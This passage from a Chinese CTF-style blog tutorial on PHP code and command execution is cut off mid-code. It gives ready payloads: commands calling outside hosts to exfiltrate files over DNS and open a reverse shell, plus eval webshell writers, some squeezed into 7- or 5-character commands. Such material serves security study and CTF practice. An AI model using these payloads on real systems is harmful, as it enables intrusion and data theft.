@@ -1,0 +1,1366 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="php代码命令执行, Lees&#39;s Blog">
+    <meta name="description" content="代码命令执行常用函数代码&amp;#x2F;命令执行攻击中，Web服务器没有过滤类似system(),eval(),exec()等函数的传入参数是造成漏洞攻击成功的最主要原因。
+
+
+
+
+
+函数
+说明
+举例
+
+
+
+${php代码}
+
+${phphin">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>php代码命令执行 | Lees&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Lees's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Lees&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fa fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fa fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fa fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fa fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fa fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fa fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Lees&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            没有目的，就做不成任何事情
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">php代码命令执行</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/rce/">
+                                <span class="chip bg-color">rce</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/rce/" class="post-category">
+                                rce
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-08-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="代码命令执行常用函数"><a href="#代码命令执行常用函数" class="headerlink" title="代码命令执行常用函数"></a>代码命令执行常用函数</h2><p>代码&#x2F;命令执行攻击中，Web服务器没有过滤类似system(),eval(),exec()等函数的传入参数是造成漏洞攻击成功的最主要原因。</p>
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+<th>举例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>${php代码}</td>
+<td></td>
+<td>${phphinfo();}</td>
+</tr>
+<tr>
+<td>mixed eval(string $code)</td>
+<td>把字符串code作为php代码执行</td>
+<td>eval(‘phpinfo();’);</td>
+</tr>
+<tr>
+<td>bool assert(mixed $assertion[,string $description])</td>
+<td>assert()会检查指定的assertion并在结果为FALSE时采取适当的响应。如果assertion是字符串,它将会被assert()当做PHP代码来执行。</td>
+<td>assert(‘system(“whoami”)’);</td>
+</tr>
+<tr>
+<td>mixed preg_replace(mixed $pattern, mixed $replacement , mixed $subject [, int $limit&#x3D;-1 [, int &amp;$count ]])</td>
+<td>搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符时(5.5.0版本&#x2F;e 修饰符已经被弃用了)，$replacement 会被当做php代码执行。</td>
+<td>preg_replace(“&#x2F;test&#x2F;e”,”system(‘whoami’)”,’test’);</td>
+</tr>
+<tr>
+<td>mixed call_user_func (callable $callback [, mixed $parameter [, mixed$… ]] )</td>
+<td>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入ca11_user_func()的参数不能为引用传递。</td>
+<td>call_user_fun(‘system’,’whoami’);</td>
+</tr>
+<tr>
+<td>mixed call_user_func_array (callable $callback，array $param_arr )</td>
+<td>把第一个参数作为回调函数(callback) 调用，把参数数组(param_arr)作为回调函call数的的参数传入。</td>
+<td>call_user_func_array(‘system’,array(‘whoami’));</td>
+</tr>
+<tr>
+<td>string create_function(string $args,string $code)</td>
+<td>在php中使用create_function()创建一个匿名函数(lambda-style),如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行</td>
+<td>create_function(“$test”,”};phpinfo();&#x2F;*”);</td>
+</tr>
+<tr>
+<td>array array_map(callable $callback,array $array1 [,array $…])</td>
+<td>为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。</td>
+<td>array_map(“system”,array(“whoami”));</td>
+</tr>
+<tr>
+<td>array array_filter(array $array [,callable $callback [,int $flag &#x3D; 0]])</td>
+<td>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</td>
+<td>array_filter(array(“whoami”),”system”);</td>
+</tr>
+<tr>
+<td>bool usort( array &amp;$array,callable $value_compare_func)</td>
+<td>通过用户自定义的比较函数对数组进行排序。</td>
+<td>$a&#x3D;array(“whoami”,”t”);<br />usort($a,”system”);</td>
+</tr>
+<tr>
+<td>bool uasort(array &amp;$array,callable $value_compare_func)</td>
+<td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。</td>
+<td>$a&#x3D;array(“whoami”,”t”);<br />uasort($a,”system”);</td>
+</tr>
+<tr>
+<td>string system(string $command [,int &amp;$return_var ])</td>
+<td>command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出。</td>
+<td>system(“whoami”);</td>
+</tr>
+<tr>
+<td>void passthru(string $command [,int &amp;$return_var ])</td>
+<td>执行外部程序并显示原始输出</td>
+<td>passthru(“whoami”);</td>
+</tr>
+<tr>
+<td>string exec(string $command [,array &amp;$output [,int &amp;$return_var ]])</td>
+<td>执行所指定的命令，并返回结果的最后一行内容，不显示输出</td>
+<td>echo exec(“whoami”);</td>
+</tr>
+<tr>
+<td>string shell_exec(string $cmd)</td>
+<td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</td>
+<td>ehco shell_exec(“whoami”);</td>
+</tr>
+<tr>
+<td>void pcntl_exec(string $path [,array $args [,array $envs ]])</td>
+<td>path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本，args是一个要传递给程序的参数的字符串数组。该模块不能再非Unix平台（Windows）下运行。</td>
+<td>pcntl_exec(“&#x2F;bin&#x2F;cat”,array(“&#x2F;etc&#x2F;passwd”));</td>
+</tr>
+<tr>
+<td>resource popen(string $command,string $mode)</td>
+<td>打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN。</td>
+<td>$handle&#x3D;popen(“&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd”,”r”);<br />$read&#x3D;fread($handle,4096);<br />echo $read;<br />pclose($handle);</td>
+</tr>
+<tr>
+<td>反引号</td>
+<td></td>
+<td>echo `whoami`;</td>
+</tr>
+</tbody></table>
+<p><img src="https://bu.dusays.com/2021/09/13/908df4ec7a4b1.png" alt="create_function"></p>
+<p><img src="https://bu.dusays.com/2021/12/06/cbdfc717149fd.png" alt="proc_popen&amp;ob_start"></p>
+<h2 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h2><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><ul>
+<li><p>延迟<br>?cmd&#x3D;sleep 5</p>
+</li>
+<li><p>http请求<br>公网ip监听   nc -lvp 4444<br>curl命令    ?cmd&#x3D;curl ip:4444</p>
+</li>
+<li><p>dns请求<br>dns      ?cmd&#x3D;ping xxxxxxx.ceye.io</p>
+</li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li><p>使用 &gt; 或 &gt;&gt;  (有写权限)<br>?cmd&#x3D;cat flag.php&gt;flag.txt  </p>
+</li>
+<li><p>mv 或 cp      (有写权限)<br>?cmd&#x3D;mv flag.php flag.txt<br>?cmd&#x3D;cp flag.php flag.txt   </p>
+</li>
+<li><p>打包压缩      (有写权限)</p>
+<ul>
+<li>tar打包或tar打包并压缩<br>tar cvf flag.tar flag.php<br>tar zcvf flag.tar flag.php</li>
+<li>zip压缩<br>zip flag.zip flag.php</li>
+</ul>
+</li>
+<li><p>cut and sleep<br>sed指定读取文件的第几行<br>cat flag.php | sed -n ‘2p’   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sysk/p/4689575.html">sed用法</a><br>提取每一行的第3个字节<br>cut -b 3 flag.php<br>最后<br>cat flag.php | sed -n ‘2p’ | cut -b 1   <a target="_blank" rel="noopener" href="https://www.programminghunter.com/article/2509882697/">cut用法</a></p>
+</li>
+<li><p>写入webshell<br>直接写入<br>?cmd&#x3D;echo “<?php @eval(\$_POST[abc];?>)” &gt; webshell.php<br>外部下载<br>wget 网址 -O webshell.php   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sx66/p/11887022.html">wget用法</a></p>
+</li>
+<li><p>dns外带(不建议使用)<br>用 &lt; 替代空格，且对输出结果base64编码<br>curl <code>cat&lt;flag.php|base64</code><br>拼接域名后<br>curl <code>cat&lt;flag.php|base64</code>.xxxxxx.ceye.io<br>注意<br>    命令执行要避免空格，空格会导致空格后面的命令不执行；<br>    将读取的文件命令用 &#96;&#96; 包含起来；<br>    拼接的域名有长度限制<br>    base64有 &#x3D; 可能会请求不到</p>
+</li>
+<li><p>反弹shell<br>首先在公网nc监听<br>nc -lvp 4444  或  nc -vv -lp 4444<br>然后在公网写个文件(qwzf文件)，<br>内容是  bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444 0&gt;&amp;1<br>最终浏览器执行payload<br>?cmd&#x3D;curl x.x.x.x:xxxx&#x2F;qwzf|bash</p>
+<h2 id="有限字符下的命令执行"><a href="#有限字符下的命令执行" class="headerlink" title="有限字符下的命令执行"></a>有限字符下的命令执行</h2><h3 id="14位可控"><a href="#14位可控" class="headerlink" title="14位可控"></a>14位可控</h3><p><img src="https://bu.dusays.com/2021/09/13/f5f22a7ff29b1.png" alt="14位可控"><br>只能传入14个字符，但没有限制命令执行的次数，所以我们可以用 &gt; 和 &gt;&gt; 符号写入一句话木马，图有这样是可以运行的，所以构造payload为：<br>echo \&lt;?php&gt;1<br>echo eval\(&gt;&gt;1<br>echo \$_GET&gt;&gt;1<br>echo \[1\]&gt;&gt;1<br>echo \)\;&gt;&gt;1<br>mv 1 1.php</p>
+</li>
+</ul>
+<h3 id="7位可控"><a href="#7位可控" class="headerlink" title="7位可控"></a>7位可控</h3><ul>
+<li><p>知识点<br>&gt;a———————虽然没有输入但是会创建a这个文件<br>ls -t——————ls基于事件排序(从晚到早)<br>sh a——————-sh会把 a 里面的每行内容当命令来执行<br>使用 \ 进行命令拼接—–l\s 等价于 ls</p>
+</li>
+<li><p>payload:<br>&gt;hp&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;dFV\\<br>&gt;1.p\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;kX0\\<br>&gt;d\&gt;\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;bCg\\<br>&gt;\ -\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;XZh\\<br>&gt;e64\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;AgZ\\<br>&gt;bas\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;waH\\<br>&gt;7\|\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;PD9\\<br>&gt;XSk\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;o\ \\<br>&gt;Fsx\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;ech \\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ls -t&gt;0<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh 0<br>目标写入语句   “&lt;?php eval($_GET[1]);”   base64之后为 PD9waHAgZXZhbCgkX0dFVFsxXSk7</p>
+<p>需要执行的语句是  “echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php”</p>
+</li>
+</ul>
+<h3 id="5位可控"><a href="#5位可控" class="headerlink" title="5位可控"></a>5位可控</h3><ul>
+<li><p>知识点<br>输入通配符 * ，Linux会把第一个列出来的文件名当作参数<br>​    通过 rev 来倒置输出内容(rev命令将文件的每行内容以字符为单位反序输出)</p>
+<p>​    用 dir 来代替 ls 不换行输出；rev将文件内容反向输出；在用ls时，写到a文件时每个文件名都是单独的一行</p>
+<p>​    &gt;rev<br>​    echo 1234&gt;v<br>​    *v 等价于 rev v</p>
+</li>
+<li><p>payload：<br>&gt;dir&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;se\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;h\\<br>&gt;f\&gt;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;ba\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;XZ\\<br>&gt;ht-&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;\|\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;gZ\\<br>&gt;sl&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;7\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;A\\<br>*&gt;v&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;Sk\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;aH\\<br>&gt;rev&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;X\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;w\\<br>*v&gt;a&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;x\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;D9\\<br>&gt;hp&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;Fs\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;P\\<br>&gt;p\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;FV\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;S}\\<br>&gt;1.\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;d\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;IF\\<br>&gt;\&gt;\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;X0\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;{\\<br>&gt;-d\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;k\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;\$\\<br>&gt;\ \\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;g\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;o\\<br>&gt;64\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;bC\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;ch\\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;e\\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh a<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh f</p>
+</li>
+<li><p>3位可控<br>paylaod:<br>&gt;nl<br>*&gt;z<br>最后访问文件z  <a target="_blank" rel="noopener" href="http://url/z">http://url/z</a><br>根目录下有两个文件：新建的nl和当前的xxx.php<br>*号代表字符串nl xxx.php，将当前目录下所有文件的名字列出来，(试试echo *就知道了<br>将其写入一个空文件z<br>访问该文件就会自动执行字符串nl xxx.php</p>
+</li>
+</ul>
+<h2 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h2><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>​    通过非字母数字进行异或，得到所需字母</p>
+<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><ul>
+<li>字符串取反<br><img src="https://bu.dusays.com/2021/09/14/f363ee1963482.png" alt="知识点"></li>
+<li>利用汉字构造异或，得到所需字母</li>
+</ul>
+<table>
+    <tr>
+        <td ><center><img src="https://bu.dusays.com/2021/09/14/f7e0a5e171c2a.png" >知识点 </center></td>
+        <td ><center><img src="https://bu.dusays.com/2021/09/14/169db5e42f69e.png"  >脚本</center></td>
+    </tr>
+</table>
+
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>如果我们想构造任意的函数（函数、方法不区分大小写）的话，我们得从A开始，才能构造任意字符，拼接成函数</p>
+<p>数组(Array)的第一个字母是A，在php中，如果强制连接数组和字符串的话，数组会转换成字符串，值为Array；</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#Array</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#A</span>
+</code></pre>
+<p>如果自增有字符数限制的话，可以用到PHP中的NAN和INF：</p>
+<blockquote>
+<p>NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</p>
+<p>INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</p>
+</blockquote>
+<p>这样不用通过从A自增到N，可以减少很多的长度。</p>
+<p>接下来就是想办法构造_GET，慢慢自增来拿到字母，然后拼接：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span>C<span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$C</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>C<span class="token operator">/</span>C<span class="token punctuation">.</span>C<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span 